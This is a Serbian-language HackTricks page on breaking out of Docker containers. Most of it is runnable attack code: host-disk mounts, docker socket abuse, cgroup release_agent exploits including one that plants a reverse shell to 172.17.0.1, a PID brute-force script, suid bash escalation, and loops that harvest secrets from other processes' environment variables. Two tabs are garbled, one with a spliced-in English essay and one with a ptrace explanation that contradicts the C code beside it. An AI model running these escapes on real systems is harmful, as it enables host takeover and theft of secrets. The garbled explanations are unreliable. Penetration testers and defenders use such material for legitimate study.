# Docker Bekstvo / Eskalacija privilegija

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Ekspert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## Automatsko Nabrojavanje i Bekstvo

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Može takođe **nabrojati kontejnere**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Ovaj alat je prilično **koristan za nabrojavanje kontejnera u kojem se nalazite, pa čak i za automatsko bekstvo**
* [**amicontained**](https://github.com/genuinetools/amicontained): Koristan alat za dobijanje privilegija koje kontejner ima kako biste pronašli načine za bekstvo iz njega
* [**deepce**](https://github.com/stealthcopter/deepce): Alat za nabrojavanje i bekstvo iz kontejnera
* [**grype**](https://github.com/anchore/grype): Dobijte CVE-ove koji se nalaze u softveru instaliranom na slici

## Bekstvo Montiranog Docker Socketa

Ako na neki način otkrijete da je **docker socket montiran** unutar docker kontejnera, moći ćete da pobegnete iz njega.\
Ovo se obično dešava u docker kontejnerima koji iz nekog razloga moraju da se povežu sa docker daemonom kako bi obavili akcije.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
U ovom slučaju možete koristiti redovne docker komande za komunikaciju sa docker daemon-om:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
U slučaju da je **docker socket na neočekivanom mestu** i dalje možete komunicirati s njim koristeći **`docker`** komandu sa parametrom **`-H unix:///putanja/do/docker.sock`**
{% endhint %}

Docker daemon takođe može [slušati na portu (podrazumevano 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) ili na Systemd baziranim sistemima, komunikacija sa Docker daemonom može se odvijati preko Systemd socketa `fd://`.

{% hint style="info" %}
Dodatno, obratite pažnju na runtime sockete drugih visokonivnih runtime-ova:

* dockershim: `unix:///var/run/dockershim.sock`
* containerd: `unix:///run/containerd/containerd.sock`
* cri-o: `unix:///var/run/crio/crio.sock`
* frakti: `unix:///var/run/frakti.sock`
* rktlet: `unix:///var/run/rktlet.sock`
* ...
{% endhint %}

## Zloupotreba sposobnosti za bekstvo

Treba da proverite sposobnosti kontejnera, ako ima bilo koju od sledećih, možda ćete moći da pobegnete iz njega: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Možete proveriti trenutne sposobnosti kontejnera koristeći **prethodno pomenute automatske alate** ili:
```bash
capsh --print
```
Na sledećoj stranici možete **saznati više o linux sposobnostima** i kako ih zloupotrebiti da biste pobegli/escalirali privilegije:

{% content-ref url="../../linux-capabilities.md" %}
[linux-capabilities.md](../../linux-capabilities.md)
{% endcontent-ref %}

## Bekstvo iz privilegovanih kontejnera

Privilegovani kontejner može biti kreiran sa zastavicom `--privileged` ili onemogućavanjem specifičnih odbrana:

* `--cap-add=ALL`
* `--security-opt apparmor=unconfined`
* `--security-opt seccomp=unconfined`
* `--security-opt label:disable`
* `--pid=host`
* `--userns=host`
* `--uts=host`
* `--cgroupns=host`
* `Mount /dev`

Zastavica `--privileged` značajno smanjuje sigurnost kontejnera, nudeći **neograničen pristup uređajima** i zaobilazeći **nekoliko zaštita**. Za detaljniji pregled, pogledajte dokumentaciju o punim uticajima `--privileged`.

{% content-ref url="../docker-privileged.md" %}
[docker-privileged.md](../docker-privileged.md)
{% endcontent-ref %}

### Privilegovani + hostPID

Sa ovim dozvolama možete jednostavno **preći u namespace procesa koji se izvršava na hostu kao root** kao što je init (pid:1) samo pokretanjem: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Testirajte to u kontejneru izvršavanjem:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privilegovan

Samo sa privilegovanom zastavicom možete pokušati **pristupiti disku domaćina** ili pokušati **pobegnuti zloupotrebom release\_agent ili drugih bekstava**.

Testirajte sledeće obilaske u kontejneru izvršavanjem:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Montiranje diska - Poc1

Dobro konfigurisani Docker kontejneri neće dozvoliti komandu poput **fdisk -l**. Međutim, na loše konfigurisanom Docker kontejneru gde je specificiran flag `--privileged` ili `--device=/dev/sda1` sa privilegijama, moguće je dobiti privilegije da se vidi host drajv.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Dakle, preuzeti kontrolu nad host mašinom je trivijalno:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
I eto! Sada možete pristupiti fajl sistemu domaćina jer je montiran u fascikli `/mnt/hola`.

#### Montiranje diska - Poc2

Unutar kontejnera, napadač može pokušati da dobije dalji pristup osnovnom host OS putem hostPath zapisa koji je kreiran od strane klastera. U nastavku su neke uobičajene stvari koje možete proveriti unutar kontejnera da biste videli da li možete iskoristiti ovaj vektor napadača:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privilegovano bežanje zloupotrebom postojećeg release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

{% code title="Početni PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
{% endcode %}

#### Privilegovano bekstvo zloupotrebom kreiranog release_agent-a ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

{% code title="Drugi PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% endcode %}

Pronađite **objašnjenje tehnike** u:

{% content-ref url="docker-release_agent-cgroups-escape.md" %}
[docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
{% endcontent-ref %}

#### Privilegovano bežanje zloupotrebom release\_agent-a bez poznavanja relativne putanje - PoC3

U prethodnim eksploatacijama **je otkrivena apsolutna putanja kontejnera unutar datotečnog sistema domaćina**. Međutim, to nije uvek slučaj. U situacijama kada **ne znate apsolutnu putanju kontejnera unutar domaćina** možete koristiti ovu tehniku:

{% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
[release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
{% endcontent-ref %}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Izvršavanje PoC-a unutar privilegovanog kontejnera trebalo bi da pruži izlaz sličan:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Zloupotreba privilegija kroz osetljive montaže

Postoje nekoliko datoteka koje mogu biti montirane koje pružaju **informacije o osnovnom hostu**. Neke od njih čak mogu ukazivati na **nešto što će biti izvršeno od strane hosta kada se nešto desi** (što će omogućiti napadaču da pobegne iz kontejnera).\
Zloupotreba ovih datoteka može omogućiti da:

* release\_agent (već obrađeno ranije)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Međutim, možete pronaći **druge osetljive datoteke** za proveru na ovoj stranici:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### Proizvoljne montaže

U nekoliko prilika ćete primetiti da je **kontejner montirao neki volumen sa hosta**. Ako ovaj volumen nije pravilno konfigurisan, možda ćete moći da **pristupite/izmenite osetljive podatke**: Čitanje tajni, menjanje ssh authorized\_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Eskalacija privilegija sa 2 školjke i host montažom

Ako imate pristup kao **root unutar kontejnera** koji ima neki folder sa hosta montiran i uspeli ste kao neprivilegovani korisnik da pobegnete na host i imate pristup za čitanje nad montiranim folderom.\
Možete kreirati **bash suid fajl** u **montiranom folderu** unutar **kontejnera** i **izvršiti ga sa hosta** radi eskalacije privilegija.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Eskalacija privilegija sa 2 školjke

Ako imate pristup kao **root unutar kontejnera** i uspeli ste kao **neprivilegovani korisnik da pobegnete na host**, možete zloupotrebiti obe školjke da biste **eskaliirali privilegije unutar hosta** ako imate mogućnost MKNOD unutar kontejnera (to je podrazumevano) kao što je [**objašnjeno u ovom postu**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Sa takvom mogućnošću, korisnik root unutar kontejnera može **kreirati blok uređajne datoteke**. Uređajne datoteke su posebne datoteke koje se koriste za **pristupanje osnovnom hardveru i jezgrovim modulima**. Na primer, blok uređajna datoteka /dev/sda omogućava pristup **čitanju sirovih podataka na sistemskom disku**.

Docker štiti od zloupotrebe blok uređajnih datoteka unutar kontejnera sprovođenjem cgroup politike koja **blokira operacije čitanja/pisanja blok uređajnih datoteka**. Ipak, ako se blok uređajna datoteka **kreira unutar kontejnera**, postaje dostupna spoljašnjem svetu putem direktorijuma **/proc/PID/root/**. Za ovaj pristup je potrebno da **vlasnik procesa bude isti** i unutar i izvan kontejnera.

Primer **eksploatacije** iz ovog [**izveštaja**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Ako možete pristupiti procesima domaćina, bićete u mogućnosti da pristupite mnogim osetljivim informacijama koje se čuvaju u tim procesima. Pokrenite test laboratoriju:
```
docker run --rm -it --pid=host ubuntu bash
```
Na primer, bićete u mogućnosti da izlistate procese koristeći nešto poput `ps auxn` i tražite osetljive detalje u komandama.

Zatim, kako možete **pristupiti svakom procesu domaćina u /proc/ možete jednostavno ukrasti njihove tajne okoline** pokretanjem:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Takođe možete **pristupiti fajl deskriptorima drugih procesa i pročitati njihove otvorene fajlove**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Možete takođe **ubiti procese i izazvati DoS**.

{% hint style="warning" %}
Ako na neki način imate privilegovan **pristup procesu van kontejnera**, možete pokrenuti nešto poput `nsenter --target <pid> --all` ili `nsenter --target <pid> --mount --net --pid --cgroup` da **pokrenete shell sa istim ns ograničenjima** (nadam se nijednim) **kao taj proces.**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Ako je kontejner konfigurisan sa Docker [host mrežnim drajverom (`--network=host`)](https://docs.docker.com/network/host/), mrežni skup tog kontejnera nije izolovan od Docker hosta (kontejner deli mrežni prostor hosta), i kontejner ne dobija dodeljenu svoju IP adresu. Drugim rečima, **kontejner povezuje sve usluge direktno na IP hosta**. Osim toga, kontejner može **interceptovati SAV mrežni saobraćaj koji host** šalje i prima na deljenom interfejsu `tcpdump -i eth0`.

Na primer, možete koristiti ovo da **snifujete čak i lažirate saobraćaj** između hosta i instance metapodataka.

Kao u sledećim primerima:

* [Analiza: Kako kontaktirati Google SRE: Ubacivanje shell-a u cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [MITM servis metapodataka omogućava eskalaciju privilegija na root nivo (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

Takođe ćete moći da pristupite **mrežnim uslugama povezanim na localhost** unutar hosta ili čak pristupite **dozvolama metapodataka čvora** (koje mogu biti različite od onih do kojih kontejner može da pristupi).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Sa `hostIPC=true`, dobijate pristup resursima međuprocesne komunikacije (IPC) domaćina, poput **deljene memorije** u `/dev/shm`. Ovo omogućava čitanje/pisanje gde se isti IPC resursi koriste od strane drugih procesa domaćina ili podova. Koristite `ipcs` da biste detaljnije pregledali ove IPC mehanizme.

* **Pregledajte /dev/shm** - Potražite datoteke na ovom mestu deljene memorije: `ls -la /dev/shm`
* **Pregled postojećih IPC objekata** - Možete proveriti da li se koriste neki IPC objekti pomoću `/usr/bin/ipcs`. Proverite sa: `ipcs -a`

### Vraćanje sposobnosti

Ako syscall **`unshare`** nije zabranjen, možete povratiti sve sposobnosti pokretanjem:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Zloupotreba korisničkog prostora putem simboličkih veza

Druga tehnika objašnjena u postu [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) pokazuje kako možete zloupotrebiti bind montaže sa korisničkim prostorima, da biste uticali na datoteke unutar domaćina (u tom specifičnom slučaju, brisanje datoteka).

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

## CVE-ovi

### Runc eksploatacija (CVE-2019-5736)

U slučaju da možete izvršiti `docker exec` kao root (verovatno sa sudo), možete pokušati da eskalirate privilegije bežeći iz kontejnera zloupotrebom CVE-2019-5736 (eksploatacija [ovde](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Ova tehnika će u osnovi **prepisati** binarni fajl _**/bin/sh**_ domaćina **iz kontejnera**, tako da bilo ko ko izvrši docker exec može pokrenuti payload.

Promenite payload prema potrebi i izgradite main.go sa `go build main.go`. Rezultujući binarni fajl treba da bude smešten u docker kontejner radi izvršenja.\
Prilikom izvršenja, čim prikaže `[+] Overwritten /bin/sh successfully` treba da izvršite sledeće sa host mašine:

`docker exec -it <ime-kontejnera> /bin/sh`

Ovo će pokrenuti payload koji se nalazi u fajlu main.go.

Za više informacija: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
Postoje i drugi CVE-ovi na koje kontejner može biti ranjiv, možete pronaći listu na [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
{% endhint %}

## Prilagođeno bekstvo iz Docker-a

### Površina bekstva iz Docker-a

* **Prostori imena:** Proces bi trebalo da bude **potpuno odvojen od drugih procesa** putem prostora imena, tako da ne možemo pobeći interakcijom sa drugim procesima zbog prostora imena (podrazumevano ne može komunicirati putem IPC-a, unix soketa, mrežnih servisa, D-Bus-a, `/proc` drugih procesa).
* **Root korisnik**: Podrazumevano, korisnik koji pokreće proces je root korisnik (međutim, njegove privilegije su ograničene).
* **Ovlašćenja**: Docker ostavlja sledeća ovlašćenja: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **Sistemski pozivi**: Ovo su sistemski pozivi koje **root korisnik neće moći da pozove** (zbog nedostatka ovlašćenja + Seccomp). Ostali sistemski pozivi mogu se koristiti za pokušaj bekstva.

{% tabs %}
{% tab title="x64 sistemski pozivi" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 syscalls" %} 

## Docker Breakout Privilege Escalation

### Overview

Docker is a popular platform for containerization, but misconfigurations can lead to privilege escalation attacks. Attackers can break out of a Docker container to gain access to the host system and potentially compromise the entire infrastructure.

### Techniques

1. **Mounting Host Directories**: Attackers can mount host directories to access sensitive files on the host system.

2. **Docker Socket**: By mounting the Docker socket, attackers can interact with the Docker daemon and potentially gain root access to the host.

3. **Volume Mounts**: Insecure volume mounts can allow attackers to read/write sensitive files on the host system.

### Mitigation

To prevent Docker breakout privilege escalation:

- Avoid running containers with unnecessary privileges.
- Use read-only file systems where possible.
- Limit the use of volume mounts and restrict access to sensitive host directories.
- Monitor Docker activity for suspicious behavior.

By following these best practices, you can reduce the risk of Docker breakout attacks and enhance the security of your containerized environment.
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %} 

## Docker Breakout Privilege Escalation

Ovo je tehnika eskalacije privilegija koja se može koristiti za izbijanje iz Docker kontejnera i dobijanje pristupa host sistemu.

### Kako funkcioniše

Ova tehnika koristi `ptrace` sistemski poziv kako bi se pratio proces inicijalnog `init` procesa unutar Docker kontejnera. Zatim se koristi `PTRACE_SETOPTIONS` kako bi se omogućilo `PTRACE_O_TRACECLONE` praćenje kloniranih procesa. Kada se detektuje klonirani proces, koristi se `PTRACE_ATTACH` kako bi se pratio i kontrolisao klonirani proces. Konačno, kada se klonirani proces završi, koristi se `PTRACE_DETACH` kako bi se prekinulo praćenje.

### Kako se zaštititi

Da biste se zaštitili od ove vrste napada, preporučuje se da redovno ažurirate Docker i pratite najbolje prakse za bezbednost Docker kontejnera. Takođe je važno ograničiti privilegije kontejnera i pratiti i ograničiti sistemski poziv `ptrace` unutar kontejnera. 

{% endtab %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
